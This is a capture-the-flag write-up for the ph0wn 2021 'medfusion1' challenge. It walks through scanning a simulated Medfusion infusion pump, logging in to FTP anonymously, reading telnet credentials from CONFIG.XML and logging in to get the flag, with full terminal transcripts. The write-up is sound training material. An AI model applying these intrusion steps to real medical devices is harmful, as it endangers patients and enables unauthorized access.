# ph0wn 2021 medfusion1 challenge

- Category: Pentest
- Author: cryptax
- Author of the write-up: Gianluca and cryptax
- Points: 92
- 15 teams solved the challenge

## Description

The French hospital "CHU Ph0wn" uses a Smiths Medical Medfusion 4000 infusion pump, available at host *medfusion.ph0wn.org*

Find the flag :)

Please beware our hospital patients: no need to brute force ;-)

## Nmap

Using **nmap**, I saw that a telnet server and a ftp server were available at the given IP address.

Note:

- Several participants tried to connect to *http: // medfusion . ph0wn . org* and complained it was down. The infusion pump does not have a web server. Only FTP and Telnet.


## FTP

Connect to ftp server, and logged in as `anonymous` without any password.
Then enter in *passive mode* and download available `CONFIG.XML`.

Note: on FTP servers, most of the time, the *active* mode does not work. You need to specifically request *passive* mode. [Read about it here, for example](https://titanftp.com/2018/08/23/what-is-the-difference-between-active-and-passive-ftp/).

*Many participants complained FTP was down. It wasn't, but without passive mode, you cannot list and retrieve files...* The answer was always: "it's up, but you're missing a small element to do".


```
$ ftp 34.79.161.43
Connected to 34.79.161.43
220 RTCS Ready
Name (34.79.161.43): anonymous
331 Looking up password
Password:
230 Login successful
Remote system type is Unix.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (34,140,103,157,117,48).
150 Opening ASCII mode data connection.
-rw-r--r-- 1 root root 211 Oct 21 09:43 CONFIG.XML
226 Directory send OK
ftp> get CONFIG.XML
local: CONFIG.XML remote: CONFIG.XML
227 Entering Passive Mode (34,140,103,157,117,48).
150 Opening data connection for RETR.
WARNING! 8 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
211 bytes received in 0.00 secs (1.5479 MB/s)
```

## CONFIG.XML

In `CONFIG.XML`, read Telnet credentials:

```xml
<?xml version="1.0"?>
<Medfusion3600Configuration>
  <TelnetInterface>
    <Port>23</Port>
    <Username>medfusion</Username>
    <Password>chu_ph0wn</Password>
 </TelnetInterface>
</Medfusion3600Configuration>
```


I used credentials written inside `CONFIG.XML` for telnet connection, and here I found `flag1.txt` which contained the flag:


```
$ telnet  34.79.161.43
Trying 34.79.161.43...
Connected to 34.79.161.43.
Escape character is '^]'.
RTCS v2.96.00 Telnet server

Welcome to the Medfusion 4000 Configuration Interface


medfusion login: medfusion
Password: 
Linux medfusion 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-1 (2021-06-10) x86_64
 
4000>ls
copy_of_drugserver  flag1.txt  test.sh
4000>cat flag1.txt
ph0wn{so_you_are_r00t_step1_yo!}
```

*Note that this challenge is greatly inspired from [Remote Code Execution on the Smiths Medical Medfusion 4000](https://github.com/sgayou/medfusion-4000-research/blob/master/doc/README.md)*. At least one team saw that, many managed to solve - even stage 2 - without being aware of it.
